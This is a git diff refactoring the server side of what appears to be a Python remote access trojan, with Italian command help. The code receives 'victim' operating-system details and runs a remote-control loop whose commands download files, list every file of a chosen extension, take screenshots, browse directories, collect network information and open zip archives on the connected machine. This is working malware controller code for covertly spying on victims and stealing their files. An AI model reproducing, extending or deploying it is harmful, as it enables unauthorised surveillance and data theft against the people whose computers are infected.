@@ -3,8 +3,7 @@ import time
 import subprocess
 from generalServer import *
 from connectionServer import *
-def openZip(comando, clientConnection):
-    global fileLog
+def openZip(comando, clientConnection,fileLog):
     try:
         filerecv = clientConnection.recv(1024)
         try:
@@ -22,15 +21,19 @@ def openZip(comando, clientConnection):
 
             print("\n")
             fileLog = fileLog + "\n"
+            return fileLog
+
         else:
-            raise Exception
+            print(fileIf)
+            fileLog = fileLog + "\n" +fileIf+"\n"
+            return fileLog
 
     except:
         fileLog = fileLog + "\n" + "Command open gone wrong\n"
         print("Command open gone wrong\n")
+        return fileLog
 
-def filespath(clientConnection):
-    global fileLog
+def filespath(clientConnection,fileLog):
 
     for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Receiving Information", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
         sleep(0.2)
@@ -78,18 +81,26 @@ def filespath(clientConnection):
                         subprocess.call(('xdg-open', os.getcwd()+"/"+nomeFile))
                 except:
                     pass
+
+                return fileLog
+
             else:
-                raise Exception
+                print(fileIf)
+                fileLog = fileLog + "\n" + fileIf + "\n"
+                return fileLog
         except:
-            raise Exception
+            fileLog = fileLog + "\n" + "Command Filespath gone wrong\n"
+            print("Command Filespath gone wrong\n")
+            return fileLog
     except:
         #traceback.print_exc()
         fileLog = fileLog + "\n" + "Command Filespath gone wrong\n"
         print("Command Filespath gone wrong\n")
+        return fileLog
 
 
-def download(comando,clientConnection):
-    global fileLog
+def download(comando,clientConnection,fileLog):
+
     nomeFile='null'
     inizio_file='null'
     fine_file='null'
@@ -149,14 +160,24 @@ def download(comando,clientConnection):
                         fileLog = fileLog + "\n" + f"File {nomeFile} successfully downloaded\n" + "\n"
                         print(f"File {nomeFile} successfully downloaded\n")
                     time.sleep(2)
-                    return nomeFile
+                    return nomeFile, fileLog
 
                 else:
-                    raise Exception
+                    print(fileIf)
+                    fileLog = fileLog + "\n" + fileIf + "\n"
+                    return "[ERROR]", fileLog
+
             else:
                 print("Couldn't take start and end point of the file's name")
                 error = clientConnection.recv(256).decode(FORMAT)
-                raise Exception
+                fileLog = fileLog + "\n" + "Couldn't take start and end point of the file's name" + "\n"
+                print("Download failed\n")
+                try:
+                    os.remove(nomeFile)
+                except:
+                    pass
+                fileLog = fileLog + "\n" + "Download failed\n"
+                return "[ERROR]", fileLog
         except:
             print("Download failed\n")
             try:
@@ -164,15 +185,16 @@ def download(comando,clientConnection):
             except:
                 pass
             fileLog = fileLog + "\n" + "Download failed\n"
-            return "[ERROR]"
+            return "[ERROR]", fileLog
 
     else:
         print("The input doesn't match the regular expression for download command")
+        fileLog = fileLog + "\n" +"The input doesn't match the regular expression for download command\n"
+        return "[ERROR]", fileLog
 
 
 # CONTROLLO REMOTO
-def remoteControl(clientConnection,buff):
-    global fileLog
+def remoteControl(clientConnection,buff,fileLog):
 
     while True:
         try:
@@ -203,8 +225,7 @@ def remoteControl(clientConnection,buff):
             if comando == "exit":
                 print(f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n")
                 fileLog = fileLog + "\n" + f"[REMOTE CONTROL CLOSED] Remote Control procedure successfully closed!\n" + "\n"
-                print(fileLog)
-                break
+                return "[END]", fileLog
 
             elif comando[0:2] == "ls":
                 match= regexcheck_ls(comando)
@@ -234,7 +255,7 @@ def remoteControl(clientConnection,buff):
             elif comando[0:9] == "filespath":
                 reg = "^filespath .[a-z]{1,4}"
                 if (re.match(reg, comando)):
-                    filespath(clientConnection)
+                    fileLog=filespath(clientConnection,fileLog)
                 else:
                     print("Regular Expression not matched!")
 
@@ -282,7 +303,7 @@ def remoteControl(clientConnection,buff):
 
 
             elif comando[0:8] == "download":
-                nomeFile= download(comando,clientConnection)
+                nomeFile,fileLog= download(comando,clientConnection,fileLog)
                 try:
                     if nomeFile=="[ERROR]":
                         pass
@@ -359,7 +380,7 @@ def remoteControl(clientConnection,buff):
             elif comando[0:4] == "open":
                 regex = r'^open \"[a-zA-Z0-9, ,\_,\-,\.,\']+\.zip\"'
                 if re.match(regex, comando):
-                    openZip(comando, clientConnection)
+                    fileLog=openZip(comando, clientConnection,fileLog)
                 else:
                     print("Regular Expression not matched!")
 
@@ -372,21 +393,20 @@ def remoteControl(clientConnection,buff):
             if e.__class__.__name__ == "ConnectionResetError":
                 print(f"[ERROR] Connection Interrupted\n")
                 fileLog = fileLog + "\n" + "[ERROR] Connection Interrupted\n" + "\n"
-                raise e
+                return "[ERROR CONNECTION]", fileLog
             else:
-                raise e
+                return "[ERROR]", fileLog
 
 
 # OK STAMPA INFO CLIENT
-def printInformazioni(clientConnection, addr):
+def printInformazioni(clientConnection, addr, fileLog):
     buff = 1
     risposta = "1"
     nbytes = 1
     newNBytes=""
 
-    global fileLog
-    print(f"\nInformation on the victim's Operating System:")
-    fileLog = fileLog + "\n" + f"\nInformation on the victim's Operating System:" + "\n"
+    print(f"\nInformation on the victim's Operating System {addr}:")
+    fileLog = fileLog + "\n" + f"\nInformation on the victim's Operating System {addr}:" + "\n"
     try:
         while buff and nbytes != '':
             nbytes = clientConnection.recv(256).decode(FORMAT)
@@ -403,24 +423,24 @@ def printInformazioni(clientConnection, addr):
             fileLog = fileLog + "\n" + f"\n[DONE] Info received.\n" + "\n"
 
             if buff[0:6]=="[PATH]":
-                return buff
+                return buff,fileLog
             else:
-                return ""
+                return "",fileLog
     except:
         #traceback.print_exc()
         print(f"[ERROR] Information not received\n")
         fileLog = fileLog + "\n" + f"[ERROR] Information not received\n" + "\n"
-        raise Exception
+        return fileLog
 
 def commandsHelp():
     print(
         f"\n#####                                       Comandi disponibili                                                     ####")
     print()
     print(
-        f"Download di file:                           download <\"nomeFile.estensione\"> (txt docx pdf video foto excel cartelle zip ")
-    print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>")
+        f"Download di file:                           download <\"nomeFile.estensione\"> <path> (txt docx pdf video foto excel cartelle zip ")
+    print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione> (*, .pdf, .dpcx, .txt, ecc...")
     print(f"Mostra Working Directory:                   pwd")
-    print(f"Lista dei file in un percorso:              ls <Path>")
+    print(f"Lista dei file in un percorso:              ls [<Path>]")
     print(f"Cambia la Working Directory:                cd <Path>")
     print(f"Cerca un tipo di estensione in un path:     find <.estensione> <Path>")
     print(f"Effettua screenshot:                        screenshot")
@@ -428,5 +448,13 @@ def commandsHelp():
     print(f"Ripulisci terminale:                        clear")
     print(f"Informazioni ifconfig/ipconfig:             rete/network")
     print(f"Informazioni so client:                     info")
+    print(f"Aprire un file.zip:                         open <\"nomeFile.zip\">")
     print()
+    print("Tipologie di path:")
+    print("\t'.'        indica il path corrente")
+    print("\t'..'       indica il path fino alla cartella precedente")
+    print("\t'./<path>' indica il path dalla cartella corrente fino al path inserito")
+    print("\t'<path>'   indica il path")
+
+
     print("####################################\n")
